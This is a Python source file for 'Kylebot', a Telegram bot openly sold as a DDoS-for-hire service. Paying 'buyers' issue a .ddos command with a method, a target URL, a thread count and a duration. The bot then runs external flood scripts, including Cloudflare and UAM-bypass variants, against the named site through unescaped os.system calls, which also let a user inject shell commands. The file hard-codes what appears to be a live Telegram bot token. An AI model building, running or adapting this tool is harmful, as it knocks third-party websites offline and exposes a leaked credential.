__author__ = 'Kyle Tran'
__version__ = '1.2'
__github__ = 'github.com/kyletran191'
__license__ = 'GNU General Public License v3.0'
# Kylebot | Telegram DDoS Bot v1.2 | Kyle Tran
#=====Import Module=====#
import os
try:
    from telegram import Update, Bot, ParseMode
    from telegram.ext import Updater, CommandHandler, CallbackContext
except ImportError:
    os.system("pip install python-telegram-bot")
try:
    import colorama
except ImportError:
    os.system("pip install colorama")
from colorama import *
import random, datetime
#=====User && Methods Setting=====#
buyers  = [6300393008]  #          
admins  = [6300393008]  #   ID users            
owners  = [6300393008]  #          
methods = ['HTTP-FLOOD', 'HTTP-RAW', 'HTTP-RAND', 'HTTP-SOCKET','CLOUDFLARE','UAM-BYPASS','SLOW'] # Methods
year_now= datetime.datetime.now().strftime("%Y")     
token   = '7013561811:AAHwt1VzTAlbpd-AyvpbbaFBqd5-p927XjI' # paste your token here
bot     = Bot(token=token)
updater = Updater(token=token, use_context=True)
dispatcher = updater.dispatcher
#=====Random Color=====#
def random_color():
    number_lol = random.randint(1, 999999)
    while len(str(number_lol)) != 6:
        number_lol = int(str(f'{random.randint(1, 9)}{number_lol}'))
    return number_lol
#=====Bot Command=====#
def help(update: Update, context: CallbackContext):
    help_text = (
        "Kyle Network | DDoS Methods\n"
        f"DDoS Methods | @{update.message.from_user.username}\n"
        "All Methods:\n"
        "HTTP-FLOOD\nHTTP-RAW\nHTTP-RAND\nHTTP-SOCKET\nCLOUDFLARE\nUAM-BYPASS\nSLOW\n"
        "Syntax:\n"
        ".ddos <method> <url> <thread> <time>\n"
        "NOTE:\n"
        "> Don't spam the attacks or your plan will be removed.\n\n"
        "Regards,\n"
        "Kyle Network.\n"
        f"©{year_now} Copyright Kyle Tran."
    )
    update.message.reply_text(help_text, parse_mode=ParseMode.MARKDOWN)

def add_buyer(update: Update, context: CallbackContext):
    buyer = context.args[0] if context.args else None
    if update.message.from_user.id not in admins:
        update.message.reply_text(f'Sorry, @{update.message.from_user.username}, but you aren\'t an admin!')
    elif buyer in buyers:
        update.message.reply_text(f'{buyer} has already copped a spot!')
    elif buyer is None:
        update.message.reply_text('Please provide a buyer ID!')
    else:
        buyers.append(int(buyer))
        update.message.reply_text('Added buyer!')

def delete_buyer(update: Update, context: CallbackContext):
    buyer = context.args[0] if context.args else None
    if update.message.from_user.id not in admins:
        update.message.reply_text(f'Sorry, @{update.message.from_user.username}, but you aren\'t an admin!')
    elif buyer not in buyers:
        update.message.reply_text(f'{buyer} did not cop a spot!')
    elif buyer is None:
        update.message.reply_text('Please provide a buyer ID!')
    else:
        buyers.remove(int(buyer))
        update.message.reply_text('Removed buyer!')

def add_admin(update: Update, context: CallbackContext):
    admin = context.args[0] if context.args else None
    if update.message.from_user.id not in owners:
        update.message.reply_text(f'Sorry, @{update.message.from_user.username}, but you aren\'t an owner!')
    elif admin in admins:
        update.message.reply_text(f'{admin} is already an admin!')
    elif admin is None:
        update.message.reply_text('Please provide an admin ID!')
    else:
        admins.append(int(admin))
        update.message.reply_text('Added admin!')

def delete_admin(update: Update, context: CallbackContext):
    admin = context.args[0] if context.args else None
    if update.message.from_user.id not in owners:
        update.message.reply_text(f'Sorry, @{update.message.from_user.username}, but you aren\'t an owner!')
    elif admin not in admins:
        update.message.reply_text(f'{admin} is not an admin!')
    elif admin is None:
        update.message.reply_text('Please provide an admin ID!')
    else:
        admins.remove(int(admin))
        update.message.reply_text('Removed admin!')

def ddos(update: Update, context: CallbackContext):
    args = context.args
    if len(args) < 4:
        update.message.reply_text("Invalid syntax! Use .ddos <method> <url> <thread> <time>")
        return

    method, victim, thread, time = args
    if update.message.from_user.id not in buyers:
        update.message.reply_text(f"Sorry, you need to buy a spot, @{update.message.from_user.username}!")
    elif method.upper() not in methods:
        update.message.reply_text(f"Invalid method: {method}")
    else:
        max_time = 300
        max_thread = 50000
        time2 = min(int(time), max_time)
        thread2 = min(int(thread), max_thread)
        ddos_text = (
            f"Kyle Network | DDoS Attack Sent\n"
            f"Attack Sent! @{update.message.from_user.username}\n"
            f"Method: {method}\n"
            f"Thread: {thread2}\n"
            f"Time: {time2}\n"
            f"Target: {victim}\n"
            f"©{year_now} Copyright Kyle Tran."
        )
        update.message.reply_text(ddos_text, parse_mode=ParseMode.MARKDOWN)

        if method.upper() == 'HTTP-FLOOD':
            os.system(f'go run httpflood.go {victim} {thread2} get {time2} nil')
        elif method.upper() == 'HTTP-RAW':
            os.system(f'node HTTP-RAW.js {victim} {time2}')
        elif method.upper() == 'HTTP-RAND':
            os.system(f'node HTTP-RAND.js {victim} {time2}')
        elif method.upper() == 'HTTP-SOCKET':
            os.system(f'node HTTP-SOCKET.js {victim} 7000 {time2}')
        elif method.upper() == 'CLOUDFLARE':
            os.system(f'node cf.js {victim} {time2} {thread2}')
        elif method.upper() == 'UAM-BYPASS':
            os.system(f'node uambypass.js {victim} {time2} 2000 http.txt')
        elif method.upper() == 'SLOW':
            os.system(f'node slow.js {victim} {time2}')

def start(update: Update, context: CallbackContext):
    start_text = (
        f"Bot started!\n"
        f"Logged in as: {bot.username}\n"
        f"Bot ID: {bot.id}\n"
        f"Watching {len(bot.get_updates())} servers!\n"
        "Type /help to see the commands."
    )
    update.message.reply_text(start_text)

dispatcher.add_handler(CommandHandler("start", start))
dispatcher.add_handler(CommandHandler("help", help))
dispatcher.add_handler(CommandHandler("add_buyer", add_buyer))
dispatcher.add_handler(CommandHandler("delete_buyer", delete_buyer))
dispatcher.add_handler(CommandHandler("add_admin", add_admin))
dispatcher.add_handler(CommandHandler("delete_admin", delete_admin))
dispatcher.add_handler(CommandHandler("ddos", ddos))

if __name__ == '__main__':
    init(convert=True)
    updater.start_polling()
    updater.idle()
